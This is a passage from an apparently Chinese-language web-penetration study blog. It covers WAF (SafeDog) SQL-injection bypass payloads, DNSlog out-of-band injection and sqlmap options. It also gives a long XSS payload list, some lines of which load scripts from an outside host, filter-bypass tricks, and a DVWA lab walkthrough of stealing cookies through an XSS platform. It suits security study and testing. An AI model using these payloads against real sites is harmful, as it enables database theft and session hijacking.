title="4、绕过安全狗（防SQL注入功能）"></a>4、绕过安全狗（防SQL注入功能）</h4><p>什么是安全狗？</p><blockquote><p>安全狗是一种网络安全服务，主要用于网站的防护和安全监测。具体来说，网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马&#x2F;木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p></blockquote><p><a href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a></p><p>由于安全狗是一款常用于网站安全保护的服务器工具，其包含了防SQL注入的功能。绕过安全狗的防SQL注入功能，顾名思义，便能够执行SQL注入了。</p><p>那么如果绕过安全狗中的防SQL注入模块呢？</p><blockquote><p>一般来说，安全狗不会对POST请求做检测，如果POST请求也被拦截的话，那就可以尝试进行分块传输。</p></blockquote><h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>内联注释符：<code>/*!...*/</code></p><p>绕过思路：</p><p>· 首先使用常规判断注入的方法（and 1&#x3D;1 或其它）判断类型。</p><p>· 如果被拦截，使用非·常规判断方法（and -1&#x3D;-1–+ 后面的<code>--+</code>是注释符）判断类型。</p><p>· 如果还是被拦截，那基本可以判断为<code>安全狗一般都会拦截 and+一些组合语句 </code>，</p><p>· 接下来可以使用<code>四则运算</code>判断，<code>/1返回正常页面，/0返回异常页面，则表示其为数字型注入</code>，如果是数字型注入的话，尝试使用<code>order by</code>绕过：</p><blockquote><p>输入：%20&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F;%20&#x2F;<em><strong><strong>!23144by</strong></strong></em>&#x2F;%201–+</p><p>%20表示空格</p><p>实际显示： &#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F; &#x2F;*****!23144by*&#x2F; 1–+</p></blockquote><blockquote><p>字符型绕过：</p><p><code>1&#39;/case when 1=1 then &#39;1&#39; else &#39;0&#39; end--+ </code></p><p><code>1&#39;/case when 1=1 then 1 else 0 end--+</code></p></blockquote><p>· 如果被拦截了，尝试使用<code>if</code>语句：</p><blockquote><p>if(1&#x3D;1,1,0)</p><p>if(1&#x3D;0,1,0)</p></blockquote><p>如果条件为真页面返回正常，注入成功，为假页面返回异常的话。那就表明if语句绕过成功了。</p><p>· 先判断数据库长度：<code>if(length(database())&gt;0,1,0)</code></p><p>· 若被拦截，使用字符替换其中的<code>database()</code>验证是否是该函数被拦截。<code>if(length(&#39;abc&#39;)&gt;0,1,0)</code></p><p>· 若返回页面正常，则表示是其中的<code>database()</code>被拦截</p><p>· 使用<code>内联绕过</code>：<code>if(length(/*!06440database*/())%3E0,1,0)</code>其中，<code>%3E</code>表示<code>&gt; </code>符号，将函数名使用内联注释符框住，执行。</p><p>· 正常来说，如此便会成功绕过。（不会被拦截啦）</p><p>· 之后就是执行参数污染等操作了：</p><blockquote><p><code>/**&amp;id=-1 union select 1,2,3#*/ </code></p><p><code>/**-1 union select 1,2,3#*/ </code></p><p><code>/***/</code></p></blockquote><h4 id="5、DNS外带SQL注入（属于mysql盲注）"><a href="#5、DNS外带SQL注入（属于mysql盲注）" class="headerlink" title="5、DNS外带SQL注入（属于mysql盲注）"></a>5、DNS外带SQL注入（属于mysql盲注）</h4><p>使用场景：无法通过联合查询直接获取数据的情况下，注入时无回显时，可尝试使用 DNSlog 外带注入。</p><p>用途：用于在SQL注入攻击中绕过防火墙和安全措施，以获取更多的信息。</p><p>利用条件：①DNSlog外带要用到 Load_file()函数，需要当前数据库用户有读权限。②设置 <code>secure_file_priv</code>为空。查询权限的语句为：<code>select file_priv from mysql.user where user=&#39;&#39;</code></p><blockquote><p>DNSlog注入的原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为<code>summer.com</code>，要使用的payload为<code>whoami.summer.com</code>，就可以通过DNS解析日志来获取到主机名。</p></blockquote><p><a href="https://www.freebuf.com/articles/web/323674.html">mysql盲注之dns外带注入</a></p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操</a></p><h4 id="6、sqlmap使用"><a href="#6、sqlmap使用" class="headerlink" title="6、sqlmap使用"></a>6、sqlmap使用</h4><p>先验知识：</p><blockquote><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p></blockquote><p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南</a></p><p><a href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">SQLmap使用教程图文教程</a></p><p>常用表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a, --all           检索所有内容<br>   -b, --banner        检索DBMS横幅<br>   --current-user      检索DBMS当前用户<br>   --current-db        检索DBMS当前数据库<br>   --hostname          检索DBMS服务器主机名<br>   --is-dba            检测DBMS当前用户是否为DBA<br>   --<span class="hljs-built_in">users</span>             枚举DBMS用户<br>   --passwords         枚举DBMS用户密码哈希值<br>   --privileges        枚举DBMS用户权限<br>   --roles             枚举DBMS用户角色<br>   --dbs               枚举DBMS数据库<br>   --tables            枚举DBMS数据库表<br>   --columns           枚举DBMS数据库表列<br>   --schema            枚举DBMS模式<br>   --count             检索表的条目数<br>   --dump              转储DBMS数据库表条目<br>   --dump-all          转储所有DBMS数据库表条目<br>   --search            搜索列、表和/或数据库名称<br>   --comments          在枚举过程中检查DBMS注释<br>   --statements        检索在DBMS上运行的SQL语句<br>   -D DB               要枚举的DBMS数据库<br>   -T TBL              要枚举的DBMS数据库表<br>   -C COL              要枚举的DBMS数据库表列<br>   -X EXCLUDE          不要枚举的DBMS数据库标识符<br>   -U USER             要枚举的DBMS用户<br>   --exclude-sysdbs    在枚举表时排除DBMS系统数据库<br>   --pivot-column=P..  枢轴列名称<br>   --<span class="hljs-built_in">where</span>=DUMPWHERE   在转储表时使用WHERE条件<br>   --start=LIMITSTART  要检索的第一个转储表条目<br>   --stop=LIMITSTOP    要检索的最后一个转储表条目<br>   --first=FIRSTCHAR   要检索的第一个查询输出单词字符<br>   --last=LASTCHAR     要检索的最后一个查询输出单词字符<br>   --sql-query=SQLQ..  要执行的SQL语句<br>   --sql-shell         提示进行交互式SQL shell<br>   --sql-file=SQLFILE  从给定文件中执行SQL语句<br><br></code></pre></td></tr></table></figure><h3 id="②XSS跨站脚本攻击"><a href="#②XSS跨站脚本攻击" class="headerlink" title="②XSS跨站脚本攻击"></a>②XSS跨站脚本攻击</h3><h4 id="1、漏洞简介"><a href="#1、漏洞简介" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><ul><li><p>XSS，跨站脚本攻击，是指恶意攻击者网<code>web页面</code>中<code>插入恶意代码</code>，当用户<code>浏览该网页时</code>，嵌入其中的恶意代码就会被执行，从而达到攻击者的目的。</p></li><li><p>XSS属于被动攻击。最大的特点是，能注入恶意的html&#x2F;JavaScript代码到用户浏览的网页上，从而达到的挟持用户会话的目的。</p></li><li><p>危害：窃取用户&#x2F;管理员的cookie非法登陆；网站挂马（将恶意木马代码插入到web页面中，用户访问页面目标计算机就会被植入木马）；发送广告或垃圾信息。</p></li></ul><h4 id="2、漏洞类型"><a href="#2、漏洞类型" class="headerlink" title="2、漏洞类型"></a>2、漏洞类型</h4><p><strong>主要分为三种类型：</strong></p><h5 id="反射类XSS（非持久型XSS）"><a href="#反射类XSS（非持久型XSS）" class="headerlink" title="反射类XSS（非持久型XSS）"></a>反射类XSS（非持久型XSS）</h5><p>攻击者需要通过<code>诱使用户点击</code>包含XSS攻击代码的恶意链接，接着用户方的浏览器就会执行恶意代码触发XSS漏洞。</p><p>· 利用：常见的利用方法是在URL中构造，将恶意链接发送给目标用户。（当用户访问该链接时，其浏览器会向服务器发起一个GET请求来提交带有恶意代码的链接，在浏览器中解析）</p><p>· 一般情况下，反射性XSS存在于搜索框，<code>通过URL控制页面的输出</code>。简而言之为，将参数传入服务器，再由服务器输出出来。</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>攻击者需要事先将javascript<code>代码上传或存储</code>到存在漏洞的服务器中。当受害者浏览包含此恶意Javascript代码的页面时便会触发恶意代码。</p><p>· 利用：需要将恶意代码上传至服务器中。</p><p><a href="https://blog.csdn.net/weixin_45842420/article/details/123450070">本地代码上传到服务器</a></p><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>它是一种特殊的反射型XSS。</p><p>· DOM树，文档对象模型，web前端开发中常使用到的模型。</p><p>· 主要由客户端的脚本程序通过DOM动态地输出数据到页面，而非依赖于将数据提交给服务器端。明白说来是，js脚本从url中获取数据并将其传递到<code>支持动态代码执行的接收器</code>时，就会产生DOM-XSS漏洞。咦？DOM-XSS一般产生于<code>用户能够进行参数输入查询的地方</code>（比如搜索框捏）。</p><p>· 常见的接收器：</p><blockquote><p>document.write()<br>document.writeln()<br>document.domain<br>someDOMElement.innerHTML<br>someDOMElement.outerHTML<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p></blockquote><p>· 演示范例：<a href="https://blog.csdn.net/vodkaDL/article/details/111570321">Web渗透测试之XSS攻击：基于DOM的XSS</a></p><p><a href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p><h4 id="3、常用XSS语句"><a href="#3、常用XSS语句" class="headerlink" title="3、常用XSS语句"></a>3、常用XSS语句</h4><p><a href="https://www.cnblogs.com/xfbk/p/17936998">XSS注入测试思路+通用语句</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(<span class="hljs-string">&#x27;hello，gaga!&#x27;</span>);&lt;/script&gt; //经典语句!<br> <br>&gt;<span class="hljs-string">&quot;&#x27;&gt;&lt;img src=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&gt;&quot;</span><span class="hljs-string">&#x27;&gt;&lt;script&gt;alert(&#x27;</span>XSS<span class="hljs-string">&#x27;)&lt;/script&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;table background=&#x27;</span>javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br> <br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br> <br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br> <br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br> <br>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br> <br>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br> <br>%<span class="hljs-number">3</span>c/a%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>c/title%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e/index.html<br> <br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&quot;XSS&quot;)&gt;<br> <br>&lt;IMG SRC=&quot;jav    ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&quot;&lt;IMG src=&quot;/java&quot;\<span class="hljs-number">0</span>script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br> <br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br> <br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br> <br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br> <br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br> <br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;<span class="hljs-number">0</span>;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br> <br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br> <br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>behaviour: url(<span class="hljs-string">&#x27;http://www.how-to-hack.org/exploit.html&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>width: expression(alert(<span class="hljs-string">&#x27;XSS&#x27;</span>));<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;</span>XSS<span class="hljs-string">&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;</span>XSS<span class="hljs-string">&quot;))&#x27;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/javascript<span class="hljs-string">&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/css<span class="hljs-string">&quot;&gt;.XSS&#123;background-image:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. type=&quot;</span>text/css<span class="hljs-string">&quot;&gt;BODY&#123;background:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;BASE HREF=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);//<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">getURL(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">a=&quot;</span>get<span class="hljs-string">&quot;;b=&quot;</span>URL<span class="hljs-string">&quot;;c=&quot;</span>javascript.:<span class="hljs-string">&quot;;d=&quot;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;;eval(a+b+c+d);</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;XML SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&quot;</span>&gt; &lt;BODY NLOAD=<span class="hljs-string">&quot;a();&quot;</span>&gt;&lt;SCRIPT&gt;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&#125;&lt;/SCRIPT&gt;&lt;<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. SRC=&quot;</span>http://xss.ha.ckers.org/xss.jpg<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;&#x27;&#x27;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.&quot;</span>a=<span class="hljs-string">&#x27;&gt;&#x27;</span><span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT&gt;document.write(&quot;</span>&lt;SCRI<span class="hljs-string">&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></code></pre></td></tr></table></figure><h4 id="4、XSS防御"><a href="#4、XSS防御" class="headerlink" title="4、XSS防御"></a>4、XSS防御</h4><ul><li><strong>验证</strong></li></ul><p><strong>思路：</strong>过滤用户输入，使浏览器解释代码而非恶意命令。其中，最重要的是过滤和净化有害的输入，如常见的敏感字符<code>&lt;&gt; &#39; &quot; &amp; # javascript</code>等。</p><ul><li><strong>编码</strong></li></ul><p><strong>思路：</strong>转义用户输入，使得浏览器仅解释数据而非代码。</p><blockquote><p>HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体替代字符，这样做可确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p><p>一些常见的可能造成问题的字符的HTML编码如下所示：</p><p><code>显示</code><code>实体名字</code><code>实体编号</code></p><p><code>&lt;</code><code>&amp;lt;</code><code>&amp;#60;</code></p><p><code>&gt;</code><code>&amp;gt;</code><code>&amp;#62;</code></p><p><code>&amp;</code><code>&amp;amp;</code>   <code>&amp;#38;</code></p><p><code>&quot;</code><code>&amp;quot;</code> <code>&amp;#34;</code></p></blockquote><ul><li><strong>XSS Filter（自编写脚本啦）</strong></li></ul><p>XSS Filter是防御跨站脚本攻击的主要手段之一，其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。</p><p><a href="https://blog.csdn.net/qq_38118138/article/details/118081903">XSS过滤器Filter实现全过程</a></p><p><a href="https://blog.csdn.net/Code_shadow/article/details/103125060">使用Filter进行XSS过滤</a></p><h4 id="5、XSS绕过"><a href="#5、XSS绕过" class="headerlink" title="5、XSS绕过"></a>5、XSS绕过</h4><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>HTML对标签大小写不敏感，可以利用大小写混用绕过。</p><p>例如：<script>改为<ScRiPt></p><h6 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h6><p>有些情况下的规则会将黑名单标签替换为空，可以利用这一点构造标签。</p><p>例如：<script>改为<scr<script>ipt></p><p>同理，某些注释符在规则中也会替换为空，这时候可以利用它构造payload。</p><p>例如：<script>改为<scr<!---test--->ipt></p><h6 id="开口标签"><a href="#开口标签" class="headerlink" title="开口标签"></a>开口标签</h6><p>在某些特殊环境，由于html代码的补全机制，可以故意<code>不闭合标签</code>绕过黑名单检测例如：<script>改为<script</p><h6 id="空格回车Tab"><a href="#空格回车Tab" class="headerlink" title="空格回车Tab"></a>空格回车Tab</h6><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);</code>可以改为<code>java script:alert(&#39;xss&#39;);</code>等</p><h6 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h6><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码。</p><blockquote><p>href、action、formaction、location、on*、name、background、poster</p></blockquote><h6 id="绕Waf"><a href="#绕Waf" class="headerlink" title="绕Waf"></a>绕Waf</h6><p>在url上添加代码：<code>&lt;Script sRC=&#39;//xxx/xx&#39;#ewqeqweq</code>，其中，空格可以使用<code>+</code>，其它的如果需要转义的话自行百度查询吧。</p><h6 id="使用其它标签（Waf）"><a href="#使用其它标签（Waf）" class="headerlink" title="使用其它标签（Waf）"></a>使用其它标签（Waf）</h6><blockquote><p><code>&lt;svg/onload = alert(1);&gt;</code></p></blockquote><h4 id="6、伪造身份登陆（XSS获取cookie并利用）"><a href="#6、伪造身份登陆（XSS获取cookie并利用）" class="headerlink" title="6、伪造身份登陆（XSS获取cookie并利用）"></a>6、伪造身份登陆（XSS获取cookie并利用）</h4><blockquote><p>实现流程：</p><p>1、注册一个在线xss平台账号，<a href="https://xss.yt/">https://xss.yt</a></p><p>2、创建项目，获取自己对应的XSS payload（其中的项目名称和项目描述随便写）</p><p>3、选择默认模块，默认模块是读取cookie，下一步。（可以选择超强默认模块啦，无需配置keepsession）</p><p>4、然后就会出现一些可植入js代码（可利用）</p><p>5、然后，使用浏览器打开dvwa靶场，将安全级别调到low。选择反射性xss，将上面的js代码复制一个到输入框中，进行测试。</p><p>6、回到xss平台，查看内容。展开，会发现登陆用的cookie</p><p>7、获取到cookie后，打开另外一个浏览器访问dvwa(模拟攻击者操作)，f12打开开发者工具，在”存储“中找到cookie值，记录其<code>PHPSESSION</code>值</p><p>8、将之前获取到的cookie值替换上去，把security的impossible改为low,回到登录界面，在url后面加上获取到的cookie信息（cookie=security=low; PHPSESSION=记下的内容）。ps：url改为后台地址（cookie下的url地址）</p></blockquote><h3 id="③SSRF服务器端请求伪造"><a href="#③SSRF服务器端请求伪造" class="headerlink" title="③SSRF服务器端请求伪造"></a>③SSRF服务器端请求伪造</h3><h4 id="1、漏洞简介-1"><a href="#1、漏洞简介-1" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· SSRF，服务器端请求伪造，是由攻击者构造请求，但由服务端发起请求的安全漏洞。本质上属于信息泄露漏洞。</p><p>· SSRF攻击的目标是：<code>从外网无法访问的内部系统</code>。（因为其由服务器端发起，所以它能够请求到与它相连而与外网隔离的内部系统，也就是把目标网站当作中间人）</p><p>· SSRF 形成的原因：<code>大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 </code>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p><p>· 数据流：<code>攻击者</code>----<code>服务器</code>----<code>目标地址</code></p><blockquote><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议）</a></p><p><a href="https://blog.csdn.net/qq_44159028/article/details/114626708">SSRF (服务器端请求伪造) 漏洞原理与利用方式</a></p><p><a 